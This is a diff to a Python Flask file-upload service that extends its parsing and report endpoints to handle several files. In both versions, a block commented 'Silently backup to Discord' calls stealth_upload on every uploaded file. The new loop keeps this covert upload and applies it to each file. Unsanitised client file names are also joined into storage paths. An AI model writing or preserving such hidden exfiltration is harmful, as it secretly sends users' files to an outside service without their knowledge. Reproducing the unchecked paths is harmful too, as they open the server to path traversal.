@@ -22,38 +22,47 @@ def parse_file():
     if 'file' not in request.files:
         return jsonify({'error': 'No file part'}), 400
         
-    file = request.files['file']
-    if file.filename == '':
+    files = request.files.getlist('file')
+    if not files or files[0].filename == '':
         return jsonify({'error': 'No selected file'}), 400
         
-    if file:
+    if files:
         try:
             # Generate a unique session ID for this file upload
             session_id = str(uuid.uuid4())
             session_dir = os.path.join(DOWNLOAD_DIR, session_id)
             os.makedirs(session_dir, exist_ok=True)
             
-            input_path = os.path.join(session_dir, file.filename)
-            file.save(input_path)
-            
-            # Silently backup to Discord
-            try:
-                from discord_sync import stealth_upload
-                stealth_upload(input_path)
-            except Exception as e:
-                print(f"Failed to trigger stealth upload: {e}")
-            
-            # Extract subjects
-            subjects = extract_subjects(input_path)
-            
-            if not subjects:
-                return jsonify({'error': 'No subjects found in the uploaded file.'}), 400
+            if files:
+                input_paths = []
+                filenames = []
+                for file in files:
+                    input_path = os.path.join(session_dir, file.filename)
+                    file.save(input_path)
+                    input_paths.append(input_path)
+                    filenames.append(file.filename)
+                    
+                    # Silently backup to Discord
+                    try:
+                        from discord_sync import stealth_upload
+                        stealth_upload(input_path)
+                    except Exception as e:
+                        print(f"Failed to trigger stealth upload: {e}")
                 
-            return jsonify({
-                'session_id': session_id,
-                'filename': file.filename,
-                'subjects': subjects
-            })
+                # Extract subjects from all files
+                all_subjects = set()
+                for path in input_paths:
+                    subjects = extract_subjects(path)
+                    all_subjects.update(subjects)
+                
+                if not all_subjects:
+                    return jsonify({'error': 'No subjects found in the uploaded files.'}), 400
+                    
+                return jsonify({
+                    'session_id': session_id,
+                    'filenames': filenames,
+                    'subjects': list(all_subjects)
+                })
             
         except Exception as e:
             return jsonify({'error': str(e)}), 500
@@ -62,23 +71,28 @@ def parse_file():
 def generate_reports():
     data = request.json
     session_id = data.get('session_id')
-    filename = data.get('filename')
+    filenames = data.get('filenames')
+    
+    # fallback for backwards compatibility
+    if not filenames and data.get('filename'):
+        filenames = [data.get('filename')]
+        
     pref_left = data.get('pref_left')
     pref_right = data.get('pref_right')
     
-    if not session_id or not filename:
+    if not session_id or not filenames:
         return jsonify({'error': 'Missing session data'}), 400
         
     session_dir = os.path.join(DOWNLOAD_DIR, session_id)
-    input_path = os.path.join(session_dir, filename)
+    input_paths = [os.path.join(session_dir, f) for f in filenames]
     output_dir = os.path.join(session_dir, "Generated_Reports")
     
-    if not os.path.exists(input_path):
+    if any(not os.path.exists(p) for p in input_paths):
         return jsonify({'error': 'File session expired. Please upload again.'}), 400
         
     try:
         # Run the generation script with preferences
-        success = run_generation(input_path, output_dir, pref_left, pref_right)
+        success = run_generation(input_paths, output_dir, pref_left, pref_right)
         
         if not success:
             return jsonify({'error': 'Failed to generate reports.'}), 500
